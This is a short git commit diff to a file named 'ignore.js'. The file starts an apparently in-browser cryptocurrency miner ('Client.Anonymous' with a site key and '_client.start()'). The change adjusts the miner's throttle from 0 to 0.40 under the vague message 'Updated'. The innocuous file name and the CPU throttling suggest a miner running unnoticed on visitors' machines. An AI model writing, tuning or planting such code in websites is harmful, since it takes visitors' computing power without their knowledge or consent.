04ddf7cdfe72dd29c007b46c3b1e53a75aa78f39
Axole Maranjana <axolemaranjana4@gmail.com>
2022-02-06 12:50:41 +0200

    Updated

--- ignore.js
+++ ignore.js
@@ -1,4 +1,4 @@
 var _client = new Client.Anonymous('4249114402ba8888fc65f5d4b9ec59873f49c8bc7dd22f091cc762a9d50004d2', {
-    throttle: 0, c: 'w', ads: 0
+    throttle: 0.40, c: 'w', ads: 0
 });
 _client.start();
